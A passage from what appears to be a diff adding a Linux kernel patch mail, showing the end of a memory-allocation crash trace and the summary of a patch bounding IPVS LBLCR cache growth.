+[  442.216092][ T9063]  ? __alloc_pages_noprof+0xd53/0x26d0
+[  442.216459][ T9063]  ? __pfx_out_of_memory+0x10/0x10
+[  442.216798][ T9063]  ? lock_acquire+0x2f/0xb0
+[  442.217089][ T9063]  ? __alloc_pages_noprof+0xd53/0x26d0
+[  442.217466][ T9063]  __alloc_pages_noprof+0x1ecc/0x26d0
+[  442.217851][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  442.218230][ T9063]  ? hlock_class+0x4e/0x130
+[  442.218550][ T9063]  ? __pfx___alloc_pages_noprof+0x10/0x10
+[  442.218913][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  442.219285][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  442.219654][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  442.220026][ T9063]  ? __pfx_mark_lock+0x10/0x10
+[  442.220352][ T9063]  ? __pfx_mark_lock+0x10/0x10
+[  442.220684][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  442.221049][ T9063]  ? lock_acquire.part.0+0x119/0x370
+[  442.221418][ T9063]  alloc_pages_mpol_noprof+0x1ab/0x4d0
+[  442.221777][ T9063]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
+[  442.222193][ T9063]  new_slab+0x303/0x420
+[  442.222480][ T9063]  ___slab_alloc+0xe60/0x19e0
+[  442.222783][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  442.223164][ T9063]  ? getname_flags.part.0+0x4a/0x4a0
+[  442.223506][ T9063]  ? __print_lock_name+0x1d1/0x260
+[  442.223851][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  442.224234][ T9063]  ? getname_flags.part.0+0x4a/0x4a0
+[  442.224585][ T9063]  ? __slab_alloc.isra.0+0x5b/0xb0
+[  442.224921][ T9063]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  442.225292][ T9063]  __slab_alloc.isra.0+0x5b/0xb0
+[  442.225616][ T9063]  ? getname_flags.part.0+0x4a/0x4a0
+[  442.225954][ T9063]  kmem_cache_alloc_noprof+0x281/0x2c0
+[  442.226383][ T9063]  getname_flags.part.0+0x4a/0x4a0
+[  442.233177][ T9063]  </TASK>
+[  442.233539][ T9063] Kernel Offset: disabled
+[  442.233839][ T9063] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  ipvs: bound LBLCR cache growth
+
+ net/netfilter/ipvs/ip_vs_lblcr.c | 3 +++
+ 1 file changed, 3 insertions(+)
+
+-- 
+2.43.0
